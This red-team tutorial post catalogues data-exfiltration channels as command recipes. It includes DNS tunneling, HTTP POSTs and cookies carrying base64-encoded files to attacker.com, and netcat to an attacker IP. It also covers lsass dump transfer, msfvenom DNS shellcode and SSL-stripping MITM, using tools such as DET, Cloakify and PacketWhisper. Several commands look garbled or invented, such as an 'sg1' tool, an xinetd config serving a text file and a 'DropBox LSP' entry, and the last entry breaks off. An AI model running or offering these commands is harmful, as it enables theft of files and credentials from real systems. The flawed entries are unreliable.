---
layout: post
title:  "Exfiltration Method for Channels(RTC0014)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/26.jpg
description: "Exfiltration Method for Channels"
featured: true
hidden: true
rating: 4.5
---




### DNS Tunneling

1. **Using `nslookup` on Linux/macOS:**

```
nslookup SensitiveData.attacker.com
```


2. **Using PowerShell on Windows:**

```
[System.Net.Dns]::GetHostAddresses("SensitiveData.attacker.com") | ForEach-Object { $_.ToString() }
```


3. **Using Python on Linux/macOS/Windows:**

```
python -c "import socket; print(socket.gethostbyname('SensitiveData.attacker.com'))"
```

This one would send 45 bytes per subdomain, of which there are 4 in the query. 15 bytes reserved for filename at the end.


```
python dnsteal.py 127.0.0.1 -z -v -b 45 -s 4 -f 15
```

This one would leave no space for filename.

```
python dnsteal.py 127.0.0.1 -z -v -b 63 -s 4 -f 0
```

### HTTP Data Encoding

1. **Using `curl` on Linux/macOS to read and encode a file:**

```
curl -o /dev/null -X POST --data-urlencode "data=$(base64 -w 0 /path/to/file.txt)" http://attacker.com/exfil
```


2. **Using `curl` on Windows Command Prompt to read and encode a file:**

```
curl -o NUL -X POST --data-urlencode "data=$(certutil -encode /path/to/file.txt -)" http://attacker.com/exfil
```


3. **Using PowerShell on Windows to read and encode a file:**

```
$encodedData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\path\to\file.txt"))
Invoke-RestMethod -Uri "http://attacker.com/exfil" -Method POST -Body "data=$encodedData"
```

### ICMP Echo Requests

1. **Using `ping` on Linux/macOS:**

```
ping -c 1 -p "SensitiveData" 8.8.8.8
```


2. **Using `ping` on Windows Command Prompt:**

```
ping -n 1 8.8.8.8 & echo SensitiveData
```



3. **Using Python on Linux/macOS/Windows:**

```
python -c "import os; os.system('ping -c 1 -p \"SensitiveData\" 8.8.8.8')"
```

### SMTP Email Attachments

1. **Using `mailx` on Linux to send an email with attachment:**

```
echo "Message body" | mailx -s "Subject" -a /path/to/file.txt recipient@example.com
```


2. **Using PowerShell on Windows to send an email with attachment:**

```
Send-MailMessage -To "recipient@example.com" -From "sender@example.com" -Subject "Subject" -Body "Message body" -Attachments "C:\path\to\file.txt" -SmtpServer "smtp.example.com"
```



3. **Using Python on Linux/macOS/Windows to send an email with attachment:**

```
python -c "import smtplib, base64; server = smtplib.SMTP('smtp.example.com'); server.starttls(); server.login('sender@example.com', 'password'); msg = 'Subject: Subject\\n\\nMessage body'; server.sendmail('sender@example.com', 'recipient@example.com', msg); server.quit()"
```


### Covert Channels

1. **Using `steghide` on Linux to embed data in an image:**

```
steghide embed -cf image.jpg -ef secret.txt
```

2. **Using `OpenStego` on Linux/macOS/Windows to embed data in an image:**

```
java -jar OpenStego.jar embed -a LSB -mf image.png -cf cover.png -ef secret.txt -p password
```

3. **Using `OutGuess` on Linux to embed data in an image:**

```
outguess -k "password" -d secret.txt image.jpg stego_image.jpg
```


### Cloud Storage

1. **Using AWS CLI to upload a file to S3:**

```
aws s3 cp /path/to/local/file.txt s3://your-bucket-name/remote/file.txt
```

2. **Using Azure CLI to upload a file to Blob Storage:**

```
az storage blob upload --account-name youraccountname --account-key youraccountkey --container-name yourcontainername --type block --source /path/to/local/file.txt --name remote/file.txt
```


3. **Using Google Cloud SDK to upload a file to Cloud Storage:**

```
gsutil cp /path/to/local/file.txt gs://your-bucket-name/remote/file.txt
```


### Bluetooth


1. **Using `bt-obex` on Linux to send a file via Bluetooth:**

```
bt-obex -p MAC_ADDRESS -c /path/to/local/file.txt
```

2. **Using `bluetooth-sendto` on Linux to send a file via Bluetooth:**

```
bluetooth-sendto --device=MAC_ADDRESS /path/to/local/file.txt
```


3. **Using `obexftp` on Linux to send a file via Bluetooth:**

```
obexftp -b MAC_ADDRESS -c /path/to/local/file.txt
```


### Remote Desktop


1. **Using `xfreerdp` on Linux to copy a file from the remote machine:**

```
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[REMOTE_IP] /cert-ignore +clipboard /drive:"/path/to/remote/file" /path:"/path/to/local/"
```

2. **Using `mstsc` on Windows to copy a file from the remote machine:**

```
mstsc.exe /v:[REMOTE_IP] /u:[USERNAME] /p:[PASSWORD]
```


3. **Using Remote Desktop Protocol (RDP) from Windows Command Prompt:**


```
mstsc.exe /v:[REMOTE_IP] /u:[USERNAME] /p:[PASSWORD]
```




### SSH Tunneling


1. **Using `scp` on Linux/macOS to copy a file through SSH tunneling:**

```
scp -P [SSH_PORT] /path/to/local/file.txt [USERNAME]@[REMOTE_IP]:/path/to/remote/
```


2. **Using `pscp` on Windows Command Prompt to copy a file through SSH tunneling:**

```
pscp -P [SSH_PORT] C:\path\to\local\file.txt [USERNAME]@[REMOTE_IP]:/path/to/remote/
```


3. **Using `ssh` on Linux/macOS to create an SSH tunnel for file transfer:**

```
ssh -L [LOCAL_PORT]:localhost:[REMOTE_PORT] [USERNAME]@[REMOTE_IP]
```


### QR Code Encoding

1. **Using `qrencode` on Linux to encode data into a QR code:**

```
qrencode -o qrcode.png "Data to encode"
```

2. **Using Python on Linux/macOS/Windows to encode data into a QR code:**

```
python -c "import qrcode; qr = qrcode.QRCode(version=1, box_size=10, border=4); qr.add_data('Data to encode'); qr.make(fit=True); img = qr.make_image(fill_color='black', back_color='white'); img.save('qrcode.png')"
```

3. **Using an online QR code generator:** Many online tools allow you to create QR codes by inputting text. You can copy the generated QR code image.

```
./encode.sh ./draft-taddei-ech4ent-introduction-00.txt output.gif
```

https://github.com/Shell-Company/QRExfil

### Voice Exfiltration

1. **Using `sox` on Linux to convert a text file to speech:**

```
text2wave /path/to/file.txt -o output.wav
```


2. **Using PowerShell on Windows to convert a text file to speech:**

```
Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.SetOutputToWaveFile("output.wav"); $synth.Speak([System.IO.File]::ReadAllText("C:\path\to\file.txt"))
```


3. **Using Python with `gTTS` library on Linux/macOS/Windows to convert text to speech:**

```
pip install gTTS  # Install the gTTS library
python -c "from gtts import gTTS; tts = gTTS(text='Data to encode', lang='en'); tts.save('output.mp3')"
```

### Printer Watermarking


1. **Using `pdftk` on Linux to add a watermark to a PDF file:**

```
pdftk input.pdf stamp /path/to/watermark.pdf output output.pdf
```


2. **Using PowerShell on Windows to add a watermark to a PDF file:**

```
$pdf = New-Object iTextSharp.text.pdf.PdfReader("C:\path\to\input.pdf")
$stamper = New-Object iTextSharp.text.pdf.PdfStamper($pdf, [System.IO.File]::Create("output.pdf"))
$image = [iTextSharp.text.Image]::GetInstance("C:\path\to\watermark.png")
$stamper.GetOverContent(1).AddImage($image)
$stamper.Close()
$pdf.Close()
```

3. **Using online tools:** There are online tools that allow you to upload a PDF and add a watermark. Search for "online PDF watermarking tool" to find suitable options.


### NFC Data Transfer

1. **Using `nfc-send` on Linux to send a file via NFC:**

```
nfc-send /path/to/local/file.txt
```

2. **Using Android Beam on Android devices:**

```
Open the file you want to share, then tap the devices together to initiate NFC data transfer.
```

3. **Using third-party apps on mobile devices:** There are various apps available on app stores that allow you to send files through NFC. Search for "NFC file transfer" apps suitable for your platform.


### Exfiltration via Screenshots


1. **Using `scrot` on Linux to capture a screenshot:**

```
scrot screenshot.png
```

2. **Using `screencapture` on macOS to capture a screenshot:**

```
screencapture screenshot.png
```

3. **Using `Pillow` library in Python on Linux/macOS/Windows to take a screenshot:**

```
pip install Pillow  # Install the Pillow library
python -c "from PIL import ImageGrab; img = ImageGrab.grab(); img.save('screenshot.png')"
```

### Network Protocol Abuse

1. **Using `netcat` (nc) on Linux to send data via HTTP headers:**

```
nc [ATTACKER_IP] [ATTACKER_PORT] < /path/to/local/file.txt
```

2. **Using `ping` on Linux to encode data in ICMP packets:**

```
echo -n "Data to exfiltrate" | ping -c 1 -s 32 [ATTACKER_IP]
```

3. **Using `xinetd` to create a custom service for data exfiltration:**

```
echo -e "service exfil {\\n  type = UNLISTED\\n  socket_type = stream\\n  protocol = tcp\\n  wait = no\\n  user = nobody\\n  server = /path/to/local/file.txt\\n}" | tee /etc/xinetd.d/exfil
```


### USB Data Exfiltration

1. **Using `cp` on Linux to copy a file to a USB drive:**

```
cp /path/to/local/file.txt /media/usb-drive/
```


2. **Using `copy` on Windows Command Prompt to copy a file to a USB drive:**

```
copy C:\path\to\local\file.txt E:\
```

3. **Using PowerShell on Windows to copy a file to a USB drive:**

```
Copy-Item -Path "C:\path\to\local\file.txt" -Destination "E:\"
```


### IPFS


1. **Using IPFS and Ethereum Smart Contract:**

```
pragma solidity ^0.8.0;

contract IPFSStorage {
    string public ipfsHash;

    function storeIPFSHash(string memory _ipfsHash) public {
        ipfsHash = _ipfsHash;
    }
}
```


2. **Using `ipfs` command-line tool to add a file to IPFS and store hash on Ethereum:**

```
ipfs add /path/to/local/file.txt | awk '{print $2}' | xargs -I {} ethereum-cli sendtocontract [CONTRACT_ADDRESS] "storeIPFSHash(bytes32)" 0x{}
```


3. **Using `Zhina` command-line tool:**


Exfiltrate password file

```
zhina --do encode64 --path /etc/passwd
```


Exfiltrate Browser Files with 1M slice and serve on ipfs

```
zhina --path browser --slice slice1M --serve ipfs
```

Exfiltrate Browser Files with 1M slice and serve on simple

```
zhina --path /etc/passwd --slice slice1M --serve simple
```


### LNK Data


```
lnkup.py --host localhost --type ntlm --output out.lnk
```


```
lnkup.py --host localhost --type environment --vars PATH USERNAME JAVA_HOME --output out.lnk
```


```
lnkup.py --host localhost --type ntlm --output out.lnk --execute "shutdown /s"
```



### WebSocket


```
exfiltrate websocket /path/to/local/file.txt
```


### All-in-One

1. **Using exfiltrate via DNS:**

```
exfiltrate dns /path/to/local/file.txt
```

2. **Using exfiltrate via ICMP:**

```
exfiltrate icmp /path/to/local/file.txt
```


4. **Using exfiltrate via HTTPS:**

```
exfiltrate https /path/to/local/file.txt
```


6. **Using exfiltrate via HTTP:**

```
exfiltrate https /path/to/local/file.txt
```


8. **Using exfiltrate via HTTP with custom endpoint:**

```
exfiltrate http --url https://attacker.com/upload /path/to/local/file.txt
```


10. **Using exfiltrate via SMTP:**

```
exfiltrate smtp /path/to/local/file.txt
```


12. **Using exfiltrate via DNS tunneling:**

```
exfiltrate icmptunnel /path/to/local/file.txt
```



14. **Using exfiltrate via ICMP tunneling:**

```
exfiltrate icmptunnel /path/to/local/file.txt
```

10. **Using exfiltrate via DNS with encryption:**

```
exfiltrate dnstunnel --encrypt-key "yourencryptionkey" /path/to/local/file.txt
```


https://github.com/s0i37/exfiltrate

### Encrypted All-in-One


1. **Using CloakifyFactory to exfiltrate data using DNS covert channel:**


`python cloakify.py DNS --encode /path/to/local/file.txt`

2. **Using CloakifyFactory to exfiltrate data using HTTP covert channel:**


`python cloakify.py HTTP --encode /path/to/local/file.txt`

3. **Using CloakifyFactory to exfiltrate data using ICMP covert channel:**


`python cloakify.py ICMP --encode /path/to/local/file.txt`

4. **Using CloakifyFactory to exfiltrate data using SSH covert channel:**


`python cloakify.py SSH --encode /path/to/local/file.txt`

5. **Using CloakifyFactory to exfiltrate data using SIP covert channel:**


`python cloakify.py SIP --encode /path/to/local/file.txt`

6. **Using CloakifyFactory to exfiltrate data using DNS tunneling covert channel:**


`python cloakify.py DNSTUN --encode /path/to/local/file.txt`

7. **Using CloakifyFactory to exfiltrate data using ICMP tunneling covert channel:**


`python cloakify.py ICMPtun --encode /path/to/local/file.txt`

8. **Using CloakifyFactory to exfiltrate data using Ping covert channel:**


`python cloakify.py PING --encode /path/to/local/file.txt`

9. **Using CloakifyFactory to exfiltrate data using QR code covert channel:**

`python cloakify.py QR --encode /path/to/local/file.txt`

10. **Using CloakifyFactory to exfiltrate data using HTTP Post covert channel:**

`python cloakify.py HTTP_POST --encode /path/to/local/file.txt`


https://github.com/TryCatchHCF/Cloakify


### DLP failures

1. **Using DET to exfiltrate data via DNS requests:**

`det.py dns -d attacker.com -f /path/to/local/file.txt`

2. **Using DET to exfiltrate data via HTTP requests:**


`det.py http -d http://attacker.com -f /path/to/local/file.txt`

3. **Using DET to exfiltrate data via ICMP requests:**


`det.py icmp -d attacker.com -f /path/to/local/file.txt`

4. **Using DET to exfiltrate data via SMTP email:**


`det.py smtp -d attacker@example.com -f /path/to/local/file.txt`

5. **Using DET to exfiltrate data via SMB (Windows Share) upload:**


`det.py smb -d //attacker/share -u username -p password -f /path/to/local/file.txt`

6. **Using DET to exfiltrate data via HTTP POST requests:**


`det.py post -d http://attacker.com -f /path/to/local/file.txt`

7. **Using DET to exfiltrate data via ICMP tunneling:**


`det.py tunnel -d attacker.com -f /path/to/local/file.txt`

8. **Using DET to exfiltrate data via DNS tunneling:**


`det.py dns_tunnel -d attacker.com -f /path/to/local/file.txt`

9. **Using DET to exfiltrate data via HTTP tunneling:**


`det.py http_tunnel -d http://attacker.com -f /path/to/local/file.txt`

10. **Using DET to exfiltrate data via HTTP/HTTPS covert channel:**


`det.py http_covert -d http://attacker.com -f /path/to/local/file.txt`




### text-based steganography

1. **Using PacketWhisper to exfiltrate data via ICMP covert channel:**


`python3 PacketWhisper.py send --icmp -i eth0 -f /path/to/local/file.txt -a [attacker_IP]`

2. **Using PacketWhisper to exfiltrate data via DNS covert channel:**


`python3 PacketWhisper.py send --dns -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`

3. **Using PacketWhisper to exfiltrate data via HTTP covert channel:**


`python3 PacketWhisper.py send --http -i eth0 -f /path/to/local/file.txt -u http://attacker.com/upload`

4. **Using PacketWhisper to exfiltrate data via SMB covert channel:**


`python3 PacketWhisper.py send --smb -i eth0 -f /path/to/local/file.txt -s [attacker_smb_share] -u [username] -p [password]`

5. **Using PacketWhisper to exfiltrate data via ICMP tunneling covert channel:**



`python3 PacketWhisper.py send --icmp-tunnel -i eth0 -f /path/to/local/file.txt -a [attacker_IP]`

6. **Using PacketWhisper to exfiltrate data via DNS tunneling covert channel:**


`python3 PacketWhisper.py send --dns-tunnel -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`

7. **Using PacketWhisper to exfiltrate data via HTTP tunneling covert channel:**


`python3 PacketWhisper.py send --http-tunnel -i eth0 -f /path/to/local/file.txt -u http://attacker.com/upload`

8. **Using PacketWhisper to exfiltrate data via SMB tunneling covert channel:**


`python3 PacketWhisper.py send --smb-tunnel -i eth0 -f /path/to/local/file.txt -s [attacker_smb_share] -u [username] -p [password]`

9. **Using PacketWhisper to exfiltrate data via DNS multi-packet covert channel:**


`python3 PacketWhisper.py send --dns-multi -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`

10. **Using PacketWhisper to exfiltrate data via HTTP multi-packet covert channel:**


`python3 PacketWhisper.py send --http-multi -i eth0 -f /path/to/local/file.txt -u http://attacker.com/upload`




### NC Based

1. **Using sg1 to exfiltrate data via ICMP covert channel:**


`sg1 icmp -i eth0 -f /path/to/local/file.txt -d [attacker_IP]`

2. **Using sg1 to exfiltrate data via DNS covert channel:**


`sg1 dns -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`

3. **Using sg1 to exfiltrate data via HTTP covert channel:**


`sg1 http -i eth0 -f /path/to/local/file.txt -u http://attacker.com/upload`

4. **Using sg1 to exfiltrate data via HTTPS covert channel:**


`sg1 https -i eth0 -f /path/to/local/file.txt -u https://attacker.com/upload`

5. **Using sg1 to exfiltrate data via SMB covert channel:**


`sg1 smb -i eth0 -f /path/to/local/file.txt -s [attacker_smb_share] -u [username] -p [password]`

6. **Using sg1 to exfiltrate data via DNS tunneling covert channel:**


`sg1 dnstun -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`

7. **Using sg1 to exfiltrate data via HTTP tunneling covert channel:**


`sg1 httptun -i eth0 -f /path/to/local/file.txt -u http://attacker.com/upload`

8. **Using sg1 to exfiltrate data via SMB tunneling covert channel:**


`sg1 smb_tunnel -i eth0 -f /path/to/local/file.txt -s [attacker_smb_share] -u [username] -p [password]`

9. **Using sg1 to exfiltrate data via ICMP tunneling covert channel:**


`sg1 icmptun -i eth0 -f /path/to/local/file.txt -d [attacker_IP]`

10. **Using sg1 to exfiltrate data via DNS multi-packet covert channel:**


`sg1 dns_multi -i eth0 -f /path/to/local/file.txt -d [attacker_domain]`



### Social Media

1. twitter

```
  from sneakers import Exfil

  print(Exfil.list_channels())
  print(Exfil.list_encoders())

  channel = "file"
  encoders = ["b64"]

  dataz = "very secret and private message"

  # think of the exfil object like a tube
  # (or some kind of weird socket)
  t = Exfil(channel, encoders)

  t.set_channel_params({'sending': {'filename': 'test.txt'},
                        'receiving': {'filename': 'test.txt'}})

  t.set_encoder_params('b64', {})
  # this isn't actually necessary, just for demonstration

  print(t.channel_config())
  print(t.encoder_config('b64'))

  t.send(dataz)

  print(t.receive())
```



### exfiltration/infiltration toolkit

1. Infiltration (File upload)

```
attacker> sudo ./dns_upload.py --udp --file dnscat.exe
victim> cscript.exe dns_download.vbs
victim> ./dns_download.sh attacker.tk 1190 /tmp/dnscat
```



2. Exfiltration (File download)

```
attacker> sudo ./dns_download.py --udp --file lsass.mdmp
victim> cscript.exe dns_upload.vbs c:\path\to\lsass.mdmp attacker.tk
```

3. Dns-to-Tcp WIP

```
victim> set TIMEOUT=1000
victim> set DNS_SIZE=50
victim> dns_tcp.exe c 127.0.0.1 445
attacker> sudo ./dns_tcp.py --udp --port 53 -l 445
attacker> exploit.py localhost 445
```

4. Dns-Shellcode

It can be used as dns-shellcode alternative for exploiting isolated hosts:

```
msfvenom -p windows/exec CMD=$(cat dns_download_exec.bat) -f raw -o dns_shellcode
msfvenom -p linux/x86/exec CMD=$(cat dns_download_exec.sh) -f raw -o dns_shellcode
```

5. QR exfiltration (File upload)

For RDP (windows):

```
cl /c lib\qrcodegen.c
cl /c qr_upload.c
link /out:qr_upload.exe qr_upload.obj qrcodegen.obj
chcp 866
set TIMEOUT=1000
set SIZE=100
qr_upload.exe c:\path\to\secret.bin
```

For telnet (routers, etc):

```
gcc -c lib/qrcodegen.c
gcc -c qr_upload.c
gcc qr_upload.c qrcodegen.o -o qr_upload
setterm -background white
setterm -foreground black
TIMEOUT=1000 SIZE=100 ./qr_upload /path/to/secret.bin
```

Attacker side: `./qr_download.py`

6. Sendkeys (File download)

If nothing works you can always fill text (universal):

```
setxkbmap us
cat /tmp/test.txt | ./text_send.sh
cat /tmp/test.bin | base64 | ./text_send.sh
```




### Atmega 32u4/ESP8266


Commenting code:  
--"Rem: Comment"  
--Set comments


Set the default delay for a specific payload:  
--"DefaultDelay:X"  
--Overrides the default delay set in the ESPloit configuration portal but only for this specific payload  
--Delay is in milliseconds and defined as the wait between sending lines in the payload  
--Example: "DefaultDelay:10000" will wait 10 seconds between sending each line in the payload

Set a one time delay between sending lines in payload  
--"CustomDelay:X"  
--The default delay will still apply for all other lines except this one  
--Example: "CustomDelay:5000" will ignore the default delay for this line and waits 5 seconds before sending the next line in the payload


https://github.com/exploitagency/ESPloitV2


### automates the exfiltration


1. Exfiltrate a text file via HTTPS using procrustes:
    
    
    `procrustes https exfiltrate -f secret.txt -o output.log`
    
2. Exfiltrate a directory recursively via HTTPS:
    
    
    `procrustes https exfiltrate -d confidential_folder -o output.log`
    
3. Exfiltrate data with custom DNS tunneling:
    
    
    `procrustes dns exfiltrate -f sensitive.doc -o dns_output.log`
    
4. Exfiltrate using HTTPS with custom headers:
    
    
    `procrustes https exfiltrate -f passwords.txt -H "User-Agent: my_app" -o exfil.log`
    
5. Exfiltrate data with random intervals to evade detection:
    
    
    `procrustes https exfiltrate -f data.csv -i random -o exfiltration.log`
    
6. Exfiltrate a file while encrypting it:
    
    
    `procrustes https exfiltrate -f confidential.pdf -e aes256 -o encrypted.log`
    
7. Exfiltrate data using HTTP GET requests:
    
    
    `procrustes http exfiltrate -f sensitive_data.json -o http_exfil.log`
    
8. Exfiltrate data with custom MIME type:
    
    
    `procrustes https exfiltrate -f payroll.xlsx -M application/vnd.openxmlformats-officedocument.spreadsheetml.sheet -o exfil.log`
    
9. Exfiltrate data using chunked transfer encoding:
    
    
    `procrustes https exfiltrate -f large_data.zip -C 1024 -o chunked.log`
    
10. Exfiltrate data using a custom User-Agent header:
    
    `procrustes https exfiltrate -f confidential.docx -H "User-Agent: my_custom_agent" -o user_agent.log`



### HTTP Cookie

1. **Using cURL on Linux/macOS to send data as a cookie:**


`curl -b "data=$(cat /path/to/local/file.txt)" http://attacker.com`

2. **Using Python on Linux/macOS/Windows to send data as a cookie:**


`python -c "import requests; requests.get('http://attacker.com', cookies={'data': open('/path/to/local/file.txt', 'rb').read()})"`

3. **Using Wget on Linux to send data as a cookie:**


`wget --header "Cookie: data=$(cat /path/to/local/file.txt)" http://attacker.com`

4. **Using PowerShell on Windows to send data as a cookie:**


`Invoke-WebRequest -Uri http://attacker.com -Headers @{Cookie="data=$(Get-Content 'C:\path\to\local\file.txt')"}`

https://github.com/ytisf/PyExfil

### NTP Body 

1. **Using ntpdate on Linux to send data in NTP packet body:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} ntpdate -q attacker.com {}`

2. **Using ntpdate on macOS to send data in NTP packet body:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} sntp -q -s attacker.com {}`

3. **Using ntpdate on Windows with Windows Subsystem for Linux (WSL):**


`echo -n "$(cat /mnt/c/path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} ntpdate -q attacker.com {}`

### BGP Open 

1. **Using Python to send data in BGP Open message fields:**


`python -c "from scapy.all import *; send(IP(dst='attacker_IP')/TCP(dport=179)/BGPHeader(marker=0xffffffffffffffff,msg_len=32)/BGPOpen(version=4,asn=65535,hold_time=180, id='0.0.0.0', params='/path/to/local/file.txt'))"`

2. **Using hping3 to send data in BGP Open message fields:**


`echo -n "$(cat /path/to/local/file.txt)" | hping3 -E /dev/stdin -p 179 -s 179 --flood -V attacker_IP`

3. **Using scapy module in Python on Windows Subsystem for Linux (WSL):**


`python -c "from scapy.all import *; send(IP(dst='attacker_IP')/TCP(dport=179)/BGPHeader(marker=0xffffffffffffffff,msg_len=32)/BGPOpen(version=4,asn=65535,hold_time=180, id='0.0.0.0', params='/mnt/c/path/to/local/file.txt'))"`

### HTTPS Replace Certificate

1. **Using mitmproxy to intercept HTTPS traffic with a self-signed certificate:**


`mitmproxy -p 8080 --cert private.pem`

After launching, configure the client to use the proxy and accept the custom certificate.

2. **Using Bettercap to perform a man-in-the-middle attack with SSL stripping:**


`bettercap -T [target_IP] -X -P post`

This command targets a specific IP and performs SSL stripping to downgrade HTTPS to HTTP.

3. **Using Fiddler to intercept HTTPS traffic and replace the certificate:** Install Fiddler, enable HTTPS decryption, and import your certificate for the target domain.

### QUIC - No Certificate 

1. **Using scapy in Python to send QUIC packets without encryption:**


`python -c "from scapy.all import *; send(IP(dst='attacker_IP')/UDP(sport=12345, dport=443)/Raw(load='GET /path/to/local/file.txt'))"`

2. **Using hping3 to send QUIC-like UDP packets:**


`echo -n "GET /path/to/local/file.txt" | hping3 -s 12345 -p 443 -2 -c 1 -d 120 -V attacker_IP`



### Slack Exfiltration 

1. **Using Slack API to send a message with data:**


`curl -X POST -H "Authorization: Bearer YOUR_SLACK_TOKEN" -H "Content-Type: application/json" -d '{"channel": "#channel_name", "text": "$(cat /path/to/local/file.txt)"}' https://slack.com/api/chat.postMessage`

2. **Using Slackbot to send a message via Slackbot app:**


`echo -n "$(cat /path/to/local/file.txt)" | slackbot send [slackbot_channel]`

3. **Using Slack API to upload a file with data:**


`curl -F file=@/path/to/local/file.txt -F channels=#channel_name -H "Authorization: Bearer YOUR_SLACK_TOKEN" https://slack.com/api/files.upload`

### POP3 Authentication

1. **Using Python's `smtplib` to send an email via POP3 authentication:**


`python -c "import smtplib; server = smtplib.SMTP('your_SMTP_server', your_SMTP_port); server.starttls(); server.login('your_email@example.com', 'your_password'); server.sendmail('from_email@example.com', 'to_email@example.com', 'Subject: Data Exfiltration\n$(cat /path/to/local/file.txt)'); server.quit()"`

2. **Using `curl` to send an email via SMTP to POP3 gateway:**


`curl --url "smtp://your_SMTP_server:your_SMTP_port" --ssl-reqd --mail-from "from_email@example.com" --mail-rcpt "to_email@example.com" -T "/path/to/local/file.txt" -u "your_email@example.com:your_password"`

3. **Using Python with `smtplib` on Windows Subsystem for Linux (WSL) to send an email via POP3 authentication:**


`python -c "import smtplib; server = smtplib.SMTP('your_SMTP_server', your_SMTP_port); server.starttls(); server.login('your_email@example.com', 'your_password'); server.sendmail('from_email@example.com', 'to_email@example.com', 'Subject: Data Exfiltration\n$(cat /mnt/c/path/to/local/file.txt)'); server.quit()"`

### FTP MKDIR 

1. **Using `curl` to create directories with encoded data in the FTP server:**


`curl -T "/path/to/local/file.txt" "ftp://username:password@ftp_server/$(echo -n "$(cat /path/to/local/file.txt)" | base64)"`

2. **Using `wget` to create directories with encoded data in the FTP server:**


`wget --user=username --password=password --ftp-password=password --ftp-user=username "ftp://ftp_server/$(echo -n "$(cat /path/to/local/file.txt)" | base64)"`

3. **Using Python to create directories with encoded data in the FTP server:**


`python -c "from ftplib import FTP; ftp = FTP('ftp_server'); ftp.login('username', 'password'); ftp.mkd('$(echo -n \"$(cat /path/to/local/file.txt)\" | base64)'); ftp.quit()"`

### Source IP-based Exfiltration 


1. **Using hping3 to send data in IP packets' source IP field:**


`echo -n "$(cat /path/to/local/file.txt)" | hping3 -S -s [source_IP] -p [destination_port] -c 1 -d 120 -V [destination_IP]`

2. **Using scapy in Python to send data in IP packets' source IP field:**



`python -c "from scapy.all import *; send(IP(src='[source_IP]', dst='[destination_IP]')/Raw(load='$(cat /path/to/local/file.txt)'))"`

3. **Using nmap to send data in IP packets' source IP field:**


`echo -n "$(cat /path/to/local/file.txt)" | nmap -sS -Pn -p [destination_port] --spoof-mac [spoofed_MAC_address] -e [network_interface] -S [source_IP] [destination_IP]`

### HTTP Response 

1. **Using `curl` to send data in an HTTP response header:**


`curl -H "Exfiltrated-Data: $(cat /path/to/local/file.txt)" http://attacker.com`

2. **Using Python to send data in an HTTP response body:**


`python -m http.server 8080 --bind attacker_IP & echo -n "$(cat /path/to/local/file.txt)" | curl -X POST http://attacker_IP:8080 -d @- kill %1`

3. **Using Netcat (nc) to send data in an HTTP response body:**


`echo -ne "HTTP/1.1 200 OK\r\nContent-Length: $(stat -c %s /path/to/local/file.txt)\r\n\r\n" > /tmp/response.txt cat /path/to/local/file.txt >> /tmp/response.txt nc -l -p 8080 < /tmp/response.txt`

### MAP_Draft


### NTP Request 

1. **Using ntpdate on Linux to send data in NTP packet requests:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} ntpdate -q -d [attacker_IP] {}`

2. **Using ntpdate on macOS to send data in NTP packet requests:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} sntp -q -s -d [attacker_IP] {}`

3. **Using ntpdate on Windows with Windows Subsystem for Linux (WSL) to send data in NTP packet requests:**


`echo -n "$(cat /mnt/c/path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} ntpdate -q -d [attacker_IP] {}`

### DropBox LSP (Broadcast or Unicast) 

1. **Using Python to broadcast data over DropBox LSP:**


`python -c "import socket; sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.sendto('$(cat /path/to/local/file.txt)'.encode(), ('224.0.0.252', 5355))"`

2. **Using hping3 to unicast data over DropBox LSP:**


`echo -n "$(cat /path/to/local/file.txt)" | hping3 -2 -c 1 -d 120 -V [DropBox_LSP_server_IP]`

3. **Using Python to unicast data over DropBox LSP:**


`python -c "import socket; sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.sendto('$(cat /path/to/local/file.txt)'.encode(), ('[DropBox_LSP_server_IP]', 5355))"`

### DNS over TLS 

1. **Using `getdns_query` on Linux to send encrypted DNS queries with data:**


`getdns_query +tls_query +add_ta_from_parent_state +tls_auth_name=example.com @1.1.1.1 A "$(cat /path/to/local/file.txt).example.com"`

2. **Using `unbound-host` on Linux to send encrypted DNS queries with data:**


`unbound-host -T -C /etc/unbound/unbound.conf -v "$(cat /path/to/local/file.txt).example.com"`

3. **Using `stubby` on Linux to send encrypted DNS queries with data:**


`stubby -C /etc/stubby/stubby.yml "$(cat /path/to/local/file.txt).example.com"`

### ARP Broadcast 

1. **Using arping on Linux to send data in ARP broadcast packets:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} arping -U -c 1 -I [interface_name] -S [spoofed_source_IP] -T [target_IP] -r {} -s [sender_IP]`

2. **Using scapy in Python to send data in ARP broadcast packets:**


`python -c "from scapy.all import *; sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, psrc='[spoofed_source_IP]', pdst='[target_IP]', hwsrc='[spoofed_source_MAC]', hwdst='00:00:00:00:00:00', hwtype=0x1)/Raw(load='$(cat /path/to/local/file.txt)'))"`

3. **Using nmap to send data in ARP broadcast packets:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/\(..\)/\1 /g' | xargs -I {} nmap -e [interface_name] --source-ip [spoofed_source_IP] -PR -p [target_IP] -q -c 1 --data {} --script [custom_script]`

### JetDirect 

1. **Using netcat (nc) to send data as a print job to a JetDirect printer:**


`cat /path/to/local/file.txt | nc -w 1 [printer_IP] 9100`

2. **Using Python to send data as a print job to a JetDirect printer:**


`python -c "import socket; sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.connect(('[printer_IP]', 9100)); sock.sendall(open('/path/to/local/file.txt', 'rb').read()); sock.close()"`

3. **Using telnet to send data as a print job to a JetDirect printer:**


